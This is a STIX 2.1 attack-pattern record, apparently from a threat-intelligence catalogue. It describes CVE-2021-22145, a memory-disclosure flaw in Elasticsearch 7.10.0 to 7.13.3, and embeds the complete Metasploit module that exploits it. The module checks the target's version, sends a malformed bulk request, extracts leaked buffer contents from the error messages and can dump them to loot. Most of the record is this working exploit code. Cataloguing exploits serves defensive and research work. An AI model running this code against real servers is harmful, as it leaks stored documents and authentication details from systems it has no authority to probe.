{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--048e1d25-e7c3-44f4-8209-52807f89b8ad",
    "created": "2024-08-14T16:29:38.166333Z",
    "modified": "2024-08-14T16:29:38.166337Z",
    "name": "Elasticsearch Memory Disclosure",
    "description": " This module exploits a memory disclosure vulnerability in Elasticsearch 7.10.0 to 7.13.3 (inclusive). A user with the ability to submit arbitrary queries to Elasticsearch can generate an error message containing previously used portions of a data buffer. This buffer could contain sensitive information such as Elasticsearch documents or authentication details. This vulnerability's output is similar to heartbleed.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/elasticsearch_memory_disclosure.rb",
            "external_id": "elasticsearch_memory_disclosure.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-22145"
        },
        {
            "source_name": "reference",
            "url": "https://discuss.elastic.co/t/elasticsearch-7-13-4-security-update/279177"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  DEDUP_REPEATED_CHARS_THRESHOLD = 400\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Elasticsearch Memory Disclosure',\n        'Description' => %q{\n          This module exploits a memory disclosure vulnerability in Elasticsearch\n          7.10.0 to 7.13.3 (inclusive). A user with the ability to submit arbitrary\n          queries to Elasticsearch can generate an error message containing previously\n          used portions of a data buffer.\n          This buffer could contain sensitive information such as Elasticsearch\n          documents or authentication details. This vulnerability's output is similar\n          to heartbleed.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Eric Howard', # discovery\n          'R0NY' # edb exploit\n        ],\n        'References' => [\n          ['EDB', '50149'],\n          ['CVE', '2021-22145'],\n          ['URL', 'https://discuss.elastic.co/t/elasticsearch-7-13-4-security-update/279177']\n        ],\n        'DisclosureDate' => '2021-07-21',\n        'Actions' => [\n          ['SCAN', { 'Description' => 'Check hosts for vulnerability' }],\n          ['DUMP', { 'Description' => 'Dump memory contents to loot' }],\n        ],\n        'DefaultAction' => 'SCAN',\n        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [] # nothing in the docker logs anyways\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(9200),\n        OptString.new('USERNAME', [ false, 'User to login with', '']),\n        OptString.new('PASSWORD', [ false, 'Password to login with', '']),\n        OptString.new('TARGETURI', [ true, 'The URI of the Elastic Application', '/']),\n        OptInt.new('LEAK_COUNT', [true, 'Number of times to leak memory per SCAN or DUMP invocation', 1])\n      ]\n    )\n  end\n\n  def get_version\n    vprint_status('Querying version information...')\n    request = {\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'GET'\n    }\n    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present? || datastore['PASSWORD'].present?\n\n    res = send_request_cgi(request)\n\n    return nil if res.nil?\n    return nil if res.code == 401\n\n    if res.code == 200 && !res.body.empty?\n      json_body = res.get_json_document\n      if json_body.empty?\n        vprint_error('Unable to parse JSON')\n        return\n      end\n    end\n\n    json_body.dig('version', 'number')\n  end\n\n  def check_host(_ip)\n    version = get_version\n    return CheckCode::Unknown(\"#{peer} - Could not connect to web service, or unexpected response\") if version.nil?\n\n    if Rex::Version.new(version) <= Rex::Version.new('7.13.3') && Rex::Version.new(version) >= Rex::Version.new('7.10.0')\n      return Exploit::CheckCode::Appears(\"Exploitable Version Detected: #{version}\")\n    end\n\n    Exploit::CheckCode::Safe(\"Unexploitable Version Detected: #{version}\")\n  end\n\n  def leak_count\n    datastore['LEAK_COUNT']\n  end\n\n  # Stores received data\n  def loot_and_report(data)\n    if data.to_s.empty?\n      vprint_error(\"Looks like there isn't leaked information...\")\n      return\n    end\n\n    print_good(\"Leaked #{data.length} bytes\")\n    report_vuln({\n      host: rhost,\n      port: rport,\n      name: name,\n      refs: references,\n      info: \"Module #{fullname} successfully leaked info\"\n    })\n\n    if action.name == 'DUMP' # Check mode, dump if requested.\n      path = store_loot(\n        'elasticsearch.memory.disclosure',\n        'application/octet-stream',\n        rhost,\n        data,\n        nil,\n        'Elasticsearch server memory'\n      )\n      print_good(\"Elasticsearch memory data stored in #{path}\")\n    end\n\n    # Convert non-printable characters to periods\n    printable_data = data.gsub(/[^[:print:]]/, '.')\n\n    # Keep this many duplicates as padding around the deduplication message\n    duplicate_pad = (DEDUP_REPEATED_CHARS_THRESHOLD / 3).round\n\n    # Remove duplicate characters\n    abbreviated_data = printable_data.gsub(/(.)\\1{#{(DEDUP_REPEATED_CHARS_THRESHOLD - 1)},}/) do |s|\n      s[0, duplicate_pad] +\n        ' repeated ' + (s.length - (2 * duplicate_pad)).to_s + ' times ' +\n        s[-duplicate_pad, duplicate_pad]\n    end\n\n    # Show abbreviated data\n    vprint_status(\"Printable info leaked:\\n#{abbreviated_data}\")\n  end\n\n  def bleed\n    request = {\n      'uri' => normalize_uri(target_uri.path, '_bulk'),\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'data' => \"@\\n\"\n    }\n    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present? || datastore['PASSWORD'].present?\n\n    res = send_request_cgi(request)\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\") unless res.code == 400\n\n    json_body = res.get_json_document\n    if json_body.empty?\n      vprint_error('Unable to parse JSON')\n      return\n    end\n    leak1 = json_body.dig('error', 'root_cause')\n    return if leak1.blank?\n\n    leak1 = leak1[0]['reason']\n    return if leak1.nil?\n\n    leak1 = leak1.split('(byte[])\"')[1].split('; line')[0]\n\n    leak2 = json_body.dig('error', 'reason')\n    return if leak2.nil?\n\n    leak2 = leak2.split('(byte[])\"')[1].split('; line')[0]\n\n    \"#{leak1}\\n#{leak2}\"\n  end\n\n  def run\n    memory = ''\n    1.upto(leak_count) do |count|\n      vprint_status(\"Leaking response ##{count}\")\n      memory << bleed\n    end\n    loot_and_report(memory)\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-07-21"
}